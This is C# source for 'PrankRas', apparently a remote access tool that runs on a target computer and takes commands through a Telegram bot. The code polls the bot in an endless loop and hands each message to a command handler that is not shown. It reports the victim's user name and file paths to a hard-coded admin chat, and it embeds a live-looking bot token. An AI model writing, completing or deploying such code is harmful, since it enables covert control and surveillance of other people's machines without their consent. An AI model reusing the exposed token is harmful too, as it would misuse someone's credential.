using System;
using System.Net;
using SimpleJSON;
using System.Collections.Specialized;

namespace PrankRas
{
    class Program
    {
        public static string Token = @"290042758:AAElwpRzKBwfQ1EcgNxTmfn2eTduMtl7mf0";//Токен телеграм бота
        public const int ID_CHAT = 212493348;//Admin
        public static int LastUpdateID = 0;
        public static PerformCommand PC = new PerformCommand();

        static void Main(string[] args)
        {
            while (true)
            {
                GetUpdates();
                System.Threading.Thread.Sleep(1000);
            }
        }


        static void GetUpdates()
        {
            using (var webClient = new WebClient())
            {
                string response = webClient.DownloadString("https://api.telegram.org/bot" + Token + "/getUpdates" + "?offset=" + (LastUpdateID + 1));

                if (response.IndexOf("\"photo\":") != -1)//Значит загруженна фотография
                {
                    string _temp = response;
                    int _StartIndex = _temp.LastIndexOf("\"file_id\":\"") + 11;
                    int _FinishIndex = _temp.IndexOf("\"", _StartIndex);
                    string _fileID = _temp.Remove(_FinishIndex).Remove(0, _StartIndex);
                    ///
                    _temp = webClient.DownloadString("https://api.telegram.org/bot" + Token + "/getFile?file_id=" + _fileID);
                    _StartIndex = _temp.IndexOf("\"file_path\":\"") + 13;
                    _FinishIndex = _temp.IndexOf("\"", _StartIndex);
                    string _file_path = _temp.Remove(_FinishIndex).Remove(0, _StartIndex);
                    ///
                    SendMessage(_file_path.Replace("photo\\/",""), ID_CHAT);
                    //
                    ///
                    _StartIndex = response.LastIndexOf("\"update_id\":") + 12;
                    _FinishIndex = response.IndexOf(",", _StartIndex);
                    LastUpdateID = Convert.ToInt32(response.Remove(_FinishIndex).Remove(0, _StartIndex));
                    ///
                }
                else
                {
                    var N = JSON.Parse(response);

                    foreach (JSONNode r in N["result"].AsArray)
                    {
                        LastUpdateID = r["update_id"].AsInt;
                        Console.WriteLine("message: {0}", r["message"]["text"]);
                        PC.СommandProcessing((r["message"]["text"]));
                    }
                }
            }
        }
        private static void WebClient_DownloadFileCompleted(object sender, System.ComponentModel.AsyncCompletedEventArgs e)
        {
            SendMessage("Фотография скачанна", ID_CHAT);
        }
        #region Method Telegram
        public static void SendMessage(string message,int chatID)
        {
            using (var webClient = new WebClient())
            {
                if(message != "")
                {
                    var pars = new NameValueCollection();
                    pars.Add("text", Environment.UserName+":"+Environment.NewLine +   message);
                    pars.Add("chat_id", chatID.ToString());
                    webClient.UploadValues("https://api.telegram.org/bot" + Token + "/sendMessage", pars);
                }
            }
        }
        static void SendPhoto(string caption,string file_ID, int chatID)
        {
            using (var webClient = new WebClient())
            {
                var pars = new NameValueCollection();
                pars.Add("photo", file_ID);
                pars.Add("chat_id", chatID.ToString());
                pars.Add("caption", caption);
                webClient.UploadValues("https://api.telegram.org/bot" + Token + "/sendPhoto", pars);
            }
        }
        #endregion
    }
}
